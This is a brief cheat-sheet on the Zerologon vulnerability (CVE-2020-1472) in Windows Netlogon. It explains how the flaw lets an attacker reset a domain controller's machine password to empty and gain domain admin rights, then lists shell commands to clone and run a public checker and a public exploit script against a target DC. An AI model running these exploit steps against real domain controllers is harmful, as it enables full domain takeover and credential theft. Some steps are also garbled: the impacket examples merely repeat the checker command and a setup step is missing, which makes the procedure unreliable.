<b>[CVE-2020-1472] Netlogon Remote Protocol Call (MS-NRPC) Privilege Escalation (Zerologon)</b>

The attack described here takes advantage of flaws in a cryptographic authentication protocol (insecure use of AES-CFB8) that proves the authenticity and identity of a domain-joined computer to the Domain Controller (DC). Due to incorrect use of an AES mode of operation it is possible to spoof the identity of any computer account (including that of the DC itself) and set an empty password (simply sending a number of Netlogon messages in which various fields are filled with zeroes) for that account in the domain. This can then be used to obtain domain admin credentials and then restore the original DC password.

<b>In order to checking CVE-2020-1472</b>
- [X] git clone https://github.com/SecuraBV/CVE-2020-1472.git
- [X] cd CVE-2020-1472
- [X] python3 -m venv env
- [X] source env/bin/activate
- [X] pip install -r requirements.txt
- [X] python zerologon_tester.py EXAMPLE-DC 1.2.3.4 (example: ./zerologon_tester.py DC01 172.16.208.161)

<b>In order to exploit CVE-2020-1472</b>

- [X] git clone https://github.com/dirkjanm/CVE-2020-1472.git
- [X] cd CVE-2020-1472
- [X] python3 -m venv env
- [X] source env/bin/activate
- [X] python cve-2020-1472-exploit.py EXAMPLE-DC 1.2.3.4 (example: ./cve-2020-1472-exploit.py DC01 172.16.208.161)

- [X] git clone https://github.com/SecureAuthCorp/impacket.git
- [X] cd impacket
- [X] pip install .
- [X] python setup.py install
- [X] cd examples
- [ ] Example 1: python zerologon_tester.py EXAMPLE-DC 1.2.3.4 (example: ./zerologon_tester.py DC01 172.16.208.161)
- [ ] Example 2: python zerologon_tester.py EXAMPLE-DC 1.2.3.4 (example: ./zerologon_tester.py DC01 172.16.208.161)
